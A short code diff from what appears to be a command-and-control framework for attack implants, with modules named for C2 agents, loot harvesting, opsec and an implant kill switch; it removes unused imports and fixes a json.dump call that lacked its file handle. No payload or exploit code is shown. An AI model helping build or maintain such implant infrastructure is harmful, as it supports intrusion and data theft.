@@ -10,15 +10,12 @@ import os
 import threading
 import time
 
-from quantum.c2.agents.ghostfang import ensure_obsidian_agent
-from quantum.core.deps import Flask, PKCS1_OAEP, RSA, AES, Response, jsonify, request
-from quantum.core.env import LOG_DIR, LOOT_DIR, PRIV
-from quantum.core.grayfish import GRAYFISH
-from quantum.core.logging import _tail_jsonl, log
+from quantum.core.deps import Flask, PKCS1_OAEP, RSA, AES
+from quantum.core.env import LOG_DIR, PRIV
+from quantum.core.logging import log
 from quantum.core.opsec import rand_hex
 from quantum.core.logging import MitreMapper
-from quantum.postexploit.harvest import auto_parse_loot
-from quantum.postexploit.killswitch import KILLSWITCH, TASKQ, kill_all_implants
+from quantum.postexploit.killswitch import kill_all_implants
 
 TURBINE = None
 
@@ -94,7 +91,7 @@ class Federation:
         if peer not in self.peers:
             self.peers.append(peer)
             with open(self._peers_file, "w", encoding="utf-8") as fh:
-                json.dump(self.peers)
+                json.dump(self.peers, fh)
         log(f"FEDERATION: pulled peer {peer}", "FED")
         return {"peers": self.peers}
 
